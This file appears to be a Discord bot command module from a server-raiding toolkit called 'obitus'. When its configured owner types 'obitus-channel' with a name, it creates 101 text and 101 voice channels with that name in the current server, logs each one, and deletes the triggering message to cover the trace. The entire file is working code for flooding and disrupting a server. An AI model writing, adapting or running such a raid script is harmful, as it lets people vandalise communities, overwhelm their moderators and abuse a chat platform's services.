const config = require("../config.json");
exports.run = (client, message, args) => {
    if(message.guild && message.content.startsWith('obitus-channel') && message.author.id === config["user-id"]){
        let canalnome = message.content.slice('obitus-channel'.length);
        for(let i = 0; i<=100;i++){
        message.guild.channels.create(canalnome, { type: 'text'}).then(criado => console.log(`+ | Canal criado... | Nome: ${canalnome} | Type: ${criado.type}`))
        message.guild.channels.create(canalnome, { type: 'voice'}).then(criado => console.log(`+ | Canal criado... | Nome: ${canalnome} | Type: ${criado.type}`))
        .catch(console.error);
        }
        message.delete()
    }
}